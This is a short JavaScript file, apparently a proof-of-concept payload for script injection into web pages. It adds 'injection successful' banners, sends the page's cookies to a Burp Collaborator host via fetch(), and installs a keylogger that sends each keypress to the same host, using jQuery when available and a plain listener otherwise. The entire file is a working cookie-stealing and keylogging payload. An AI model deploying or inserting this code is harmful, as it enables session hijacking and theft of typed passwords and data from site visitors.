// Red banner
document.body.innerHTML += "<h1 style='color:red'>NET INJECTION POC</h1>";

// Data exfil to Burp Collaborator
fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?cookie=" + encodeURIComponent(document.cookie));

// If jQuery is available, add banners + keylogger
if (typeof $ !== "undefined") {
    $("body").prepend("<h1 style='color:red'>External JS Injection Successful</h1>");
    $(document).on("keypress", function(e) {
        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?k=" + e.key);
    });
} else {
    // Fallback if jQuery not loaded
    document.addEventListener("keypress", function(e) {
        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?k=" + e.key);
    });
}
